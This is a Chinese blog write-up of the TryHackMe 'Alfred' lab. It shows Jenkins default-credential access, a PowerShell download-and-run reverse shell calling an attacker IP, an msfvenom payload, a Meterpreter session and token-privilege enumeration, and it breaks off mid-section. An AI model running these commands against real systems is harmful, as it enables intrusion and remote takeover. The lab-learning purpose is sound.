@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>TryHackMe -- Alfred - V4ler1an</title><meta name="Description" content="THM学习训练记录"><meta property="og:title" content="TryHackMe -- Alfred" />
+<meta property="og:description" content="THM学习训练记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2024/01/thm-alfred/" /><meta property="og:image" content="https://www.v4ler1an.com/2024/01/thm-alfred/thm.jpeg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-05T07:57:40+08:00" />
+<meta property="article:modified_time" content="2024-01-05T08:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2024/01/thm-alfred/thm.jpeg" /><meta name="twitter:title" content="TryHackMe -- Alfred"/>
+<meta name="twitter:description" content="THM学习训练记录"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/thm-alfred/" /><link rel="prev" href="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TryHackMe -- Alfred",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-alfred\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-alfred\/thm.jpeg",
+                            "width":  1300 ,
+                            "height":  620 
+                        }],"genre": "posts","keywords": "THM","wordcount":  2555 ,
+        "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-alfred\/","datePublished": "2024-01-05T07:57:40+08:00","dateModified": "2024-01-05T08:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "THM学习训练记录"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2024/01/thm-alfred/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2024/01/thm-alfred/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">TryHackMe -- Alfred</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-05">2024-01-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2555 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;<span id="/2024/01/thm-alfred/" class="leancloud_visitors" data-flag-title="TryHackMe -- Alfred">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2024/01/thm-alfred/thm.jpeg"
+        data-srcset="/2024/01/thm-alfred/thm.jpeg, /2024/01/thm-alfred/thm.jpeg 1.5x, /2024/01/thm-alfred/thm.jpeg 2x"
+        data-sizes="auto"
+        alt="/2024/01/thm-alfred/thm.jpeg"
+        title="THM学习训练记录" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-access">Initial Access</a>
+      <ul>
+        <li><a href="#how-many-ports-are-open-tcp-only">How many ports are open? (TCP only)</a></li>
+        <li><a href="#what-is-the-username-and-password-for-the-login-panel-in-the-format-usernamepassword">What is the username and password for the login panel? (in the format username:password)</a></li>
+        <li><a href="#what-is-the-usertxt-flag">What is the user.txt flag?</a></li>
+      </ul>
+    </li>
+    <li><a href="#switching-shells">Switching Shells</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Alfred Walkthrough.</p>
+<h1 id="thm---alfred">THM - Alfred</h1>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="how-many-ports-are-open-tcp-only">How many ports are open? (TCP only)</h3>
+<p>端口扫描，直接nmap扫描即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -T4 -sV -Pn 10.10.222.189
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-07 01:34 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>10.10.222.189<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.36s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE    VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http       Microsoft IIS httpd 7.5
+</span></span><span class="line"><span class="cl">3389/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.31 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里没有扫描全端口，我个人的思路是先看常规端口，如果确定没有东西了，再去扫其他端口。</p>
+<h3 id="what-is-the-username-and-password-for-the-login-panel-in-the-format-usernamepassword">What is the username and password for the login panel? (in the format username:password)</h3>
+<p>需要找一个带登录框的页面，80端口没有，在8080端口找到了：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071537590.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071537590.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071537590.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071537590.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071537590.png"
+        title="image-20240307153745508" /></p>
+<p>源码上没有东西，应该是要爆破。burp尝试一下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071544087.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071544087.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071544087.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071544087.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071544087.png"
+        title="image-20240307154440058" /></p>
+<p>最终发现<code>admin/admin</code>。</p>
+<p>其实这里应该先尝试一下jenkins的默认账号密码，就是<code>admin/admin</code>。</p>
+<h3 id="what-is-the-usertxt-flag">What is the user.txt flag?</h3>
+<p>这里是希望我们使用<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener noreffer">Nishang</a>工具，大概思路就是在jenkins的dashboard中找到一个能够执行命令的地方，把工具下载下来然后执行，在攻击机做监听就可以获得反弹shell。</p>
+<p>首先，把需要用的脚本下载到攻击机https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1；</p>
+<p>然后，kali开启web server，为了目标机器能访问到下载脚本：<code>python -m http.server 8081</code>；</p>
+<p>回到jenkins，执行命令的地方在：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601188.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601188.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601188.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601188.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601188.png"
+        title="image-20240307160101134" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601397.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601397.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601397.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601397.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601397.png"
+        title="image-20240307160120348" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071604511.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071604511.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071604511.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071604511.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071604511.png"
+        title="image-20240307160444462" /></p>
+<p>需要执行的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">powershell iex <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span>‘http://10.2.124.22:8081/Invoke-PowerShellTcp.ps1<span class="err">&#39;</span><span class="o">)</span><span class="p">;</span>Invoke-PowerShellTcp -Reverse -IPAddress 10.2.124.22 -Port <span class="m">4444</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>作用就是从kali下载文件，然后去执行命令，反弹shell到kali的4444端口。</p>
+<p>kali本地开启监听，回到上层，点击build now：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071605992.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071605992.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071605992.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071605992.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071605992.png"
+        title="image-20240307160553950" /></p>
+<p>kali的监听，成功拿到shell：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071637189.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071637189.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071637189.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071637189.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071637189.png"
+        title="image-20240307163746128" /></p>
+<p>user.txt在bruce的桌面上。</p>
+<p>有报错的话可以在执行的build历史中查看详细信息：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071607735.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071607735.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071607735.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071607735.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071607735.png"
+        title="image-20240307160711688" /></p>
+<h2 id="switching-shells">Switching Shells</h2>
+<p>这一步其实在重复上面的步骤，我们可以不用powershell脚本，而是直接用msfvenom生成一个payload，然后把反弹shell引到msf上去。同理，使用cs也可以实现一样的效果。</p>
+<p>需要执行的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.2.124.22 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -f exe -o shell.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl">Found <span class="m">1</span> compatible encoders
+</span></span><span class="line"><span class="cl">Attempting to encode payload with <span class="m">1</span> iterations of x86/shikata_ga_nai
+</span></span><span class="line"><span class="cl">x86/shikata_ga_nai succeeded with size <span class="m">381</span> <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">x86/shikata_ga_nai chosen with final size <span class="m">381</span>
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">381</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">73802</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: shell.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改一下project里要执行的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">powershell <span class="s2">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.2.124.22:8081/shell.exe&#39;,&#39;shell.exe&#39;)&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>msf中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">use exploit/multi/handler 
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> PAYLOAD windows/meterpreter/reverse_tcp 
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST 10.2.124.22
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LPORT <span class="m">4443</span>
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.2.124.22:4443
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">176198</span> bytes<span class="o">)</span> to 10.10.53.218
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.2.124.22:4443 -&gt; 10.10.53.218:49236<span class="o">)</span> at 2024-03-07 04:05:29 -0500
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
+</span></span><span class="line"><span class="cl">Computer        : ALFRED
+</span></span><span class="line"><span class="cl">OS              : Windows <span class="m">7</span> <span class="o">(</span>6.1 Build 7601, Service Pack 1<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Architecture    : x64
+</span></span><span class="line"><span class="cl">System Language : en_US
+</span></span><span class="line"><span class="cl">Domain          : WORKGROUP
+</span></span><span class="line"><span class="cl">Logged On Users : <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Meterpreter     : x86/windows
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>拿到初始权限，下一步就是提权，这里希望我们使用假冒token来实现提权。关于token，看这https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</p>
+<p>记住两种主要的token就行，这里使用的是第二种。</p>
+<ul>
+<li>Primary access tokens: those associated with a user account that are generated on log on</li>
+<li>Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process</li>
+</ul>
+<p>以下是几种经常被冒用的令牌：</p>
+<ul>
+<li>SeImpersonatePrivilege</li>
+<li>SeAssignPrimaryPrivilege</li>
+<li>SeTcbPrivilege</li>
+<li>SeBackupPrivilege</li>
+<li>SeRestorePrivilege</li>
+<li>SeCreateTokenPrivilege</li>
+<li>SeLoadDriverPrivilege</li>
+<li>SeTakeOwnershipPrivilege</li>
+<li>SeDebugPrivilege</li>
+</ul>
+<p>在反弹shell里，使用<code>whoami /priv</code>可以看到当前的令牌权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\J</span>enkins<span class="se">\w</span>orkspace<span class="se">\s</span>hell&gt;whoami /priv
+</span></span><span class="line"><span class="cl">whoami /priv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                  Description                               <span class="nv">State</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege        Adjust memory quotas <span class="k">for</span> a process        Disabled
+</span></span><span class="line"><span class="cl">SeSecurityPrivilege             Manage auditing and security log          Disabled
+</span></span><span class="line"><span class="cl">SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+</span></span><span class="line"><span class="cl">SeSystemProfilePrivilege        Profile system performance                Disabled
+</span></span><span class="line"><span class="cl">SeSystemtimePrivilege           Change the system <span class="nb">time</span>                    Disabled
+</span></span><span class="line"><span class="cl">SeProfileSingleProcessPrivilege Profile single process                    Disabled
+</span></span><span class="line"><span class="cl">SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+</span></span><span class="line"><span class="cl">SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+</span></span><span class="line"><span class="cl">SeBackupPrivilege               Back up files and directories             Disabled
+</span></span><span class="line"><span class="cl">SeRestorePrivilege              Restore files and directories             Disabled
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege             Shut down the system                      Disabled
+</span></span><span class="line"><span class="cl">SeDebugPrivilege                Debug programs                            Enabled
+</span></span><span class="line"><span class="cl">SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+</span></span><span class="line"><span class="cl">SeUndockPrivilege               Remove computer from docking station      Disabled
+</span></span><span class="line"><span class="cl">SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+</span></span><span class="line"><span class="cl">SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege         Create global objects                     Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege   Increase a process working <span class="nb">set</span>            Disabled
+</span></span><span class="line"><span class="cl">SeTimeZonePrivilege             Change the <span class="nb">time</span> zone                      Disabled
+</span></span><span class="line"><span class="cl">SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到当前用户的<code>SeDebugPrivilege</code>、<code>SeImpersonatePrivilege </code>、<code>SeCreateGlobalPrivilege</code>权限是开启的。</p>
+<p>但是这里跟在meterpreter中获得结果不太一样：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
